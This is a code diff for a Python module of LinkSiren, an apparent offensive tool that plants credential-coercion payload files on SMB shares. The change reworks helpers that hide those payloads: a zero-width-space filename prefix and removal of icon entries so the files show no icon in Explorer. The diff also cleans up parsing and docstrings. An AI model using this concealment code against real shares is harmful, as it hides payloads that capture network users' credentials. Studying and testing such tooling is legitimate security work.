@@ -9,56 +9,7 @@ bulk cleanup multiple types of payloads from the identified locations.
 from datetime import datetime, timedelta
 from pathlib import Path
 import logging
-import re
 import linksiren.target
-
-
-# ZERO WIDTH SPACE. NTFS at the filesystem level accepts ASCII control
-# characters (\x01-\x1F), but Windows' SMB2 server (verified on Win11 25H2)
-# rejects all of them at the path-validation layer with
-# STATUS_OBJECT_NAME_INVALID. U+200B is accepted by SMB and renders as no
-# glyph in Explorer, giving an effectively invisible filename.
-INVISIBLE_PREFIX = "​"
-
-
-def make_invisible_payload_name(payload_name: str) -> str:
-    """Prepend ``INVISIBLE_PREFIX`` to ``payload_name`` once (idempotent)."""
-    if payload_name and payload_name.startswith(INVISIBLE_PREFIX):
-        return payload_name
-    return INVISIBLE_PREFIX + payload_name
-
-
-def make_invisible_payload_contents(payload_contents, payload_extension: str):
-    """Blank icon references inside a text payload so the tile renders empty.
-
-    Returns ``payload_contents`` unchanged for binary payloads (``.lnk``).
-    Invisibility for .lnk would require modifying the binary template's
-    icon offset and is not implemented here.
-    """
-    if payload_extension == ".lnk":
-        return payload_contents
-
-    contents = payload_contents
-
-    if payload_extension in (".library-ms", ".searchConnector-ms"):
-        # XML payloads. Strip the iconReference element so Explorer falls
-        # back to the empty/blank default icon.
-        contents = re.sub(
-            r"\s*<iconReference>[^<]*</iconReference>",
-            "",
-            contents,
-            flags=re.IGNORECASE,
-        )
-    elif payload_extension == ".url":
-        # INI-style payload. Drop IconFile= and IconIndex= lines.
-        contents = re.sub(
-            r"^\s*Icon(File|Index)\s*=.*\r?\n?",
-            "",
-            contents,
-            flags=re.IGNORECASE | re.MULTILINE,
-        )
-
-    return contents
 
 
 def process_targets(unc_paths: list):
@@ -76,14 +27,13 @@ def process_targets(unc_paths: list):
         ]
         targets = process_targets(unc_paths)
         # targets will contain HostTarget objects with grouped paths by host.
-
-    Blank lines, whitespace-only lines, and malformed UNC entries are
-    skipped with a log message rather than crashing the whole run.
     """
     targets = []
     logger = logging.getLogger("main_logger")
 
     for unc_path in unc_paths:
+        # Tolerate blank lines / accidental whitespace in targets files instead
+        # of crashing the whole run.
         stripped = unc_path.strip() if isinstance(unc_path, str) else unc_path
         if not stripped:
             continue
@@ -113,7 +63,7 @@ def parse_target(unc_path: str):
     """Split ``\\\\host\\share\\sub\\dir`` into ``(host, "share\\sub\\dir")``.
 
     The leading ``\\\\`` is required. A bare ``\\\\host`` (no share) yields
-    ``(host, "")``, used downstream as "expand to all shares on this host".
+    ``(host, "")`` — used downstream as "expand to all shares on this host".
 
     Raises:
         ValueError: if ``unc_path`` is empty or not a UNC path.
@@ -212,19 +162,60 @@ def create_lnk_payload(attacker_ip, template_bytes):
     return bytes(payload_bytes)
 
 
-def compute_threshold_date(current_date, theshold_length):
-    """
-    Computes the threshold date by subtracting a given number of days from the current date.
+def compute_threshold_date(current_date, threshold_length):
+    """Return ``current_date`` minus ``threshold_length`` days."""
+    return current_date - timedelta(days=threshold_length)
 
-    Args:
-        current_date (datetime.date): The current date.
-        theshold_length (int): The number of days to subtract from the current date.
 
-    Returns:
-        datetime.date: The computed threshold date.
+# ZERO WIDTH SPACE. NTFS accepts ASCII control chars at the filesystem
+# level, but Windows' SMB2 server (verified on Win11 25H2) rejects them
+# at the path-validation layer with STATUS_OBJECT_NAME_INVALID. U+200B
+# is accepted by SMB and renders as no glyph in Explorer.
+INVISIBLE_PREFIX = "​"
+
+
+def make_invisible_payload_name(payload_name: str) -> str:
+    """Prepend ``INVISIBLE_PREFIX`` (U+200B) to ``payload_name`` once (idempotent)."""
+    if payload_name and payload_name.startswith(INVISIBLE_PREFIX):
+        return payload_name
+    return INVISIBLE_PREFIX + payload_name
+
+
+def make_invisible_payload_contents(payload_contents, payload_extension: str):
+    """Blank icon references in a text payload so the file has no icon.
+
+    Returns ``payload_contents`` unchanged for binary payloads (``.lnk``)
+    — invisibility for lnk would require modifying the binary template's
+    icon offset and is not implemented here.
     """
-    threshold_date = current_date - timedelta(days=theshold_length)
-    return threshold_date
+    if payload_extension == ".lnk":
+        return payload_contents
+
+    contents = payload_contents
+
+    if payload_extension in (".library-ms", ".searchConnector-ms"):
+        # XML payloads — strip the iconReference element so Explorer falls
+        # back to the empty/blank default icon.
+        import re
+
+        contents = re.sub(
+            r"\s*<iconReference>[^<]*</iconReference>",
+            "",
+            contents,
+        )
+    elif payload_extension == ".url":
+        # INI payload — zero out IconFile / IconIndex lines.
+        out_lines = []
+        for line in contents.splitlines():
+            stripped = line.strip()
+            if stripped.lower().startswith(("iconfile=", "iconindex=")):
+                continue
+            out_lines.append(line)
+        contents = "\r\n".join(out_lines)
+        # Out-of-shell .url files use CRLF; the standard write path adds
+        # a final newline so don't append one here.
+
+    return contents
 
 
 def is_active_file(threshold_date, access_time):
